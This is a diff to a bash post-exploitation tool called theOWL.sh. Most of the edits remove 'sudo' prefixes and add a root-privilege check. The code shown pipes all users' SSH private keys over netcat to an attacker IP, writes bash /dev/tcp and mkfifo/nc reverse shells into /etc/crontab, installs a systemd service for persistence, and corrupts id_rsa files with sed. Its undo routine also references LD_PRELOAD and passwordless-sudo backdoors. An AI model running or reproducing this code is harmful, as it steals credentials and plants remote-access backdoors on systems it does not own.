@@ -102,7 +102,7 @@ ssh_key_generator(){
 		if [[ -d $USER ]]; then
 			if [[ ! -f "$USER/.ssh/id_rsa" ]]; then
 				mkdir -p "$USER/.ssh"
-				sudo ssh-keygen -t rsa -b 4096 -N "" -f "$USER/.ssh/id_rsa" >/dev/null || ERR_KEY_GEN=1
+				ssh-keygen -t rsa -b 4096 -N "" -f "$USER/.ssh/id_rsa" >/dev/null || ERR_KEY_GEN=1
 				# for error handling
 				if [[ $ERR_KEY_GEN == 0 ]]; then
 				 echo -e "[+] ssh key generated for user: $(basename $USER)"
@@ -146,7 +146,7 @@ ssh_key_generator(){
 
 	# sending files back to local listner
 	# creating a single file with all key values and sharing it
-	sudo cat $OWL_TMP/ssh/id_rsa_* > $OWL_TMP/all_ssh_keys
+	cat $OWL_TMP/ssh/id_rsa_* > $OWL_TMP/all_ssh_keys
 	echo -e "[+] sending ssh keys to your machine"
 	cat $OWL_TMP/all_ssh_keys | nc -w 5 $ATTACK_IP $ATTACK_PORT
 	echo -e "[+] files transfered to local machine"
@@ -166,8 +166,8 @@ ssh_obfuscation(){
 	# going through each directory for users
 	for USER in /home/*; do
 		if [[ -f "$USER/.ssh/id_rsa" ]]; then
-			sudo sed -i -e "s/A/o/g" "$USER/.ssh/id_rsa" || ERR_SSH_OBF=1 # replacing A with o
-			sudo sed -i -e "s/e/l/g" "$USER/.ssh/id_rsa" || ERR_SSH_OBF=1 # replacing e with l
+			sed -i -e "s/A/o/g" "$USER/.ssh/id_rsa" || ERR_SSH_OBF=1 # replacing A with o
+			sed -i -e "s/e/l/g" "$USER/.ssh/id_rsa" || ERR_SSH_OBF=1 # replacing e with l
 			if [[ $ERR_SSH_OBF == 0 ]]; then
 				echo -e "[+] $(basename $USER)'s ssh key obfuscated"
 				OWL_HISTORY+=("ssh-obf $USER/.ssh/id_rsa")
@@ -181,8 +181,8 @@ ssh_obfuscation(){
 	# root
 	ERR_SSH_OBF=0
 	if [[ -f "/root/.ssh/id_rsa" ]]; then
-		sudo sed -i -e "s/A/o/g" "/root/.ssh/id_rsa" || ERR_SSH_OBF=1 # replacing A with o
-		sudo sed -i -e "s/e/l/g" "/root/.ssh/id_rsa" || ERR_SSH_OBF=1 # replacing e with l
+		sed -i -e "s/A/o/g" "/root/.ssh/id_rsa" || ERR_SSH_OBF=1 # replacing A with o
+		sed -i -e "s/e/l/g" "/root/.ssh/id_rsa" || ERR_SSH_OBF=1 # replacing e with l
 		if [[ $ERR_SSH_OBF == 0 ]]; then
 			echo -e "[+] root's ssh key obfuscated"
 			OWL_HISTORY+=("ssh-obf /root/.ssh/id_rsa")
@@ -245,9 +245,9 @@ add_to_crontab(){
 		fi
 	fi
 	# basic bash tcp reverse shell
-	sudo echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$ATTACK_IP/$LPORT 0>&1'" >> /etc/crontab
+	echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/$ATTACK_IP/$LPORT 0>&1'" >> /etc/crontab
 	# netcat listner with mkfifo
-	sudo echo "* * * * * root rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $ATTACK_IP $LPORT > /tmp/f" >> /etc/crontab
+	echo "* * * * * root rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $ATTACK_IP $LPORT > /tmp/f" >> /etc/crontab
 
 	echo "[+] 2 crontabs configured. open a listener on $ATTACK_IP:$LPORT"
 	OWL_HISTORY+=("crontab /etc/crontab $ATTACK_IP $LPORT")
@@ -309,7 +309,7 @@ ExecStart=sudo bash /root/owl/syswl.sh
 [Install]
 WantedBy=default.target"
 	
-	sudo echo "$SHELL_SERVICE" > /etc/systemd/system/syswl.service
+	echo "$SHELL_SERVICE" > /etc/systemd/system/syswl.service
 	systemctl daemon-reload
 	systemctl enable syswl.service
 	systemctl start syswl.service
@@ -348,7 +348,9 @@ reverse_owl_changes(){
 			echo -e "-----------------------------------------------------------------------"
 			rm $2
 		else
-			echo -e "Invalid Command for --force-reverse.\nUsage: ./theOWL.sh --force-reverse <history_file>\nUse h / --help for more infomation" >&2
+			echo -e "history file not found!\nUsage: ./theOWL.sh --force-reverse <history_file>\nUse h / --help for more infomation" >&2
+			exit
+		fi
 	fi
 
 	# empty check
@@ -371,7 +373,7 @@ reverse_owl_changes(){
 		case $HST_CMD in
 			ssh-gen ) # delete .ssh directory
 				if [[ -d $HST_ARG ]]; then
-					sudo rm -r $HST_ARG
+					rm -r $HST_ARG
 					echo -e "[+] ssh directory removed: $HST_ARG"
 				fi
 				;;
@@ -384,7 +386,7 @@ reverse_owl_changes(){
 				read -p "Are you sure you want to remove user: $HST_ARG? " yn
 				case $yn in
 					[Yy]* )
-						sudo userdel -rf $HST_ARG || ERR_USR_DEL=1
+						userdel -rf $HST_ARG || ERR_USR_DEL=1
 						chmod u-s /bin/bash
 						if [[ $ERR_USR_DEL == 0 ]]; then
 						 echo -e "[+] user removed:$HST_ARG"
@@ -396,12 +398,12 @@ reverse_owl_changes(){
 				esac
 				;;
 			ld-pre )
-				sudo sed -i "/Defaults    env_keep += LD_PRELOAD/d" "$HST_ARG"
+				sed -i "/Defaults    env_keep += LD_PRELOAD/d" "$HST_ARG"
 				echo -e "[+] LD_PRELOAD configuration removed"
 				;;
 			sudo-find )
 				local USER=$(echo $HISTORY_ELEM | cut -d" " -f3)
-				sudo sed -i "/$USER ALL=(ALL:ALL) NOPASSWD: \/usr\/bin\/find/d" "$HST_ARG"
+				sed -i "/$USER ALL=(ALL:ALL) NOPASSWD: \/usr\/bin\/find/d" "$HST_ARG"
 				echo -e "[+] sudo find configuration removed for $USER"
 				;;
 			crontab ) # remove crontab commands i.e. lastlines of crontab
@@ -410,8 +412,8 @@ reverse_owl_changes(){
 				local A_PORT=$(echo $HISTORY_ELEM | cut -d" " -f4)
 				local CRON_CMD_1="* * * * * root \/bin\/bash -c 'bash -i >& \/dev\/tcp\/$A_IP\/$A_PORT 0>&1'"
 				local CRON_CMD_2="* * * * * root rm \/tmp\/f; mkfifo \/tmp\/f; cat \/tmp\/f | \/bin\/sh -i 2>&1 | nc $A_IP $A_PORT > \/tmp\/f"
-				sudo sed -i -e "/$CRON_CMD_1/d" "$HST_ARG" || ERR_CRON=1
-				sudo sed -i -e "/$CRON_CMD_2/d" "$HST_ARG" || ERR_CRON=1
+				sed -i -e "/$CRON_CMD_1/d" "$HST_ARG" || ERR_CRON=1
+				sed -i -e "/$CRON_CMD_2/d" "$HST_ARG" || ERR_CRON=1
 				if [[ $ERR_CRON=0 ]]; then
 					echo -e "[+] crontab commands removed"
 				else
@@ -425,7 +427,7 @@ reverse_owl_changes(){
 					local A_PORT=$(echo $HISTORY_ELEM | cut -d" " -f4)
 					local BASHRC_CMD_1="\/bin\/bash -c 'bash -i >& \/dev\/tcp\/$A_IP\/$A_PORT 0>&1'"
 					
-					sudo sed -i -e "/$BASHRC_CMD_1/d" "$HST_ARG" || ERR_BASHRC=1
+					sed -i -e "/$BASHRC_CMD_1/d" "$HST_ARG" || ERR_BASHRC=1
 					if [[ $ERR_BASHRC == 0 ]]; then
 						echo -e "[+] .bashrc file restored: $HST_ARG"
 					fi
@@ -438,10 +440,10 @@ reverse_owl_changes(){
 				systemctl disable $SVC_NAME
 				systemctl stop $SVC_NAME
 				if [[ -f $HST_ARG ]]; then
-					sudo rm "$HST_ARG"
+					rm "$HST_ARG"
 				fi
 				if [[ -d $SVC_SCRIPT ]]; then
-					sudo rm -r "$SVC_SCRIPT"
+					rm -r "$SVC_SCRIPT"
 				fi
 				echo -e "[+] $SVC_NAME systemd service removed"
 				;;
@@ -457,7 +459,7 @@ reverse_owl_changes(){
 
 clean_my_work(){
 	echo -e "[+] Cleaning my work here!"
-	sudo rm -r $OWL_TMP
+	rm -r $OWL_TMP
 	# TODO: need to implement proper methods to clear records
 }
 
@@ -558,6 +560,7 @@ auto_mode_owl(){
 	echo -e "[*] Goodbye soldier!$YELLOW laugh more!!$RESET"
 }
 
+
 ################ MAIN-CODE #####################################################
 
 CHEK_FOR_PRIV_FLAG=1 # if true(1): check for privilages [at the initial configuration]
@@ -582,6 +585,13 @@ case $1 in
 		terminal_mode_loop
 		;;
 	--force-reverse )
+		if [[ $CHEK_FOR_PRIV_FLAG != 0 ]]; then
+			# check the user privilages ; the OWL need root privilages to work properly
+			if [[ $EUID -ne 0 ]];then
+				echo -e "[$RED!$RESET] the OWL needs to be run as the root\n[$RED!$RESET] Use -P at the end of command if you are sure you have necessary privilages" >&2
+				exit
+			fi
+		fi
 		reverse_owl_changes $1 $2
 		;;
 	* )
